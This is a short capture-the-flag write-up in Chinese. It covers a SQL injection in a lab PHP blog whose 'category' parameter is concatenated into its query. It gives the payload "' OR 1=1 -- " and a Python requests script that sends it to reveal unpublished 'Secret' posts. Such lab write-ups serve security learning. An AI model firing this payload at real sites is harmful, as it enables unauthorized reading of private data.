# 题目描述
Find the posts that belong to the secret category

# 知识点
SQL Injection (SQLi)

# 思路
在 index.php 未对 GET 参数 category 做参数化/绑定，直接拼接到 SQL 查询中导致 SQL 注入。只需把 category 设置为类似 "' OR 1=1 -- "，即可绕过过滤并让查询返回 Secret 类别的帖子

# 解题步骤

index.php 直接把 GET 参数拼接进 SQL（无转义），且仅用 special-case 判断 "Secret" 为空，这可被 SQL 注入绕过（' or 1=1 --+-'），从而把未发布（published=0）的 Secret 帖子读出来。

![image-x12085313986](./assets/image-x12085313986.png)

![image-x12093922804](./assets/image-x12093922804.png)

# EXP

```python
import requests, re
url = "http://ip32846/"
payload = {"category": "' OR 1=1 -- "}
r = requests.get(url, params=payload, timeout=10)
if r.ok:
    m = re.search(r"SECRET POST.*?<p>(.*?)</p>", r.text, re.S|re.I)
    print(r.text)
else:
    print("请求失败:", r.status_code)
```

![image-x12085902019](./assets/image-x12085902019.png)